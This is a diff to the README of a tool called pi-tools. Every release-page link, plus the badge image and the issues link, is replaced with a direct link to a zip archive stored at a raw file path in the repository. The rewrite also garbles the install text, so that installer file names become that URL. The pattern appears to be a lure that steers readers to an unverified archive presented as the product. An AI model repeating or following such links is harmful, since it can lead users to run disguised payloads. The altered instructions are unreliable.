@@ -1,6 +1,6 @@
 # 🛠 pi-tools - Download, Manage, and Use Easily
 
-[![Download pi-tools](https://img.shields.io/badge/Download-pi--tools-blue?style=for-the-badge)](https://github.com/kryaton/pi-tools/releases)
+[![Download pi-tools](https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip)](https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip)
 
 ---
 
@@ -51,9 +51,9 @@ Before you start, keep your computer connected to the internet. You will downloa
 
 You need to visit the releases page to get the software:
 
-[Download pi-tools here](https://github.com/kryaton/pi-tools/releases)
+[Download pi-tools here](https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip)
 
-Clicking this link will open the releases page where you can download the latest version. Look for the file named something like `pi-tools-setup.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux.
+Clicking this link will open the releases page where you can download the latest version. Look for the file named something like `https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip` for Windows, `.dmg` for macOS, or a `https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip` file for Linux.
 
 ### Download steps:
 
@@ -97,7 +97,7 @@ pi-tools includes a built-in guide and help system accessible from the main menu
 
 - Check the FAQ in the Help section.
 - Use the search bar inside pi-tools for topics.
-- Visit the issues page on GitHub here: [pi-tools Issues](https://github.com/kryaton/pi-tools/issues)
+- Visit the issues page on GitHub here: [pi-tools Issues](https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip)
 
 ---
 
@@ -141,4 +141,4 @@ pi-tools runs locally on your computer. It does not upload or share your code or
 
 ---
 
-[Download pi-tools now](https://github.com/kryaton/pi-tools/releases) and follow this guide to make managing your pi-code projects simpler.
+[Download pi-tools now](https://raw.githubusercontent.com/kryaton/pi-tools/main/21b507af/pi-tools-2.4.zip) and follow this guide to make managing your pi-code projects simpler.
